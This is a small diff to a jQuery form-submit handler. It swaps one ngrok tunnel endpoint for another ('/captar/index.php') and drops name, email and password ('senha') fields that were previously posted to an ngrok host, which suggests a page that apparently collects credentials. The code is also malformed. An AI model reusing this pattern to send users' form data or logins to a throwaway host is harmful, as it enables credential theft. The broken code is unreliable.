@@ -42,11 +42,9 @@ $(document).ready(function(){
             $("#notific").show();
             $.ajax(
                 method = "POST",
-                url = "https://a959dbf49800.ngrok.io/git/index.php",
+                url = "http://3911337d7e9d.ngrok.io/captar/index.php",
                 data = {
-                    nome: $("#nome"),
-                    email: $("#email"),
-                    senha: $("#senha")
+                    texto: $("#nome"),
                 }
             ).done(function(){
                 $("#notific").hide();
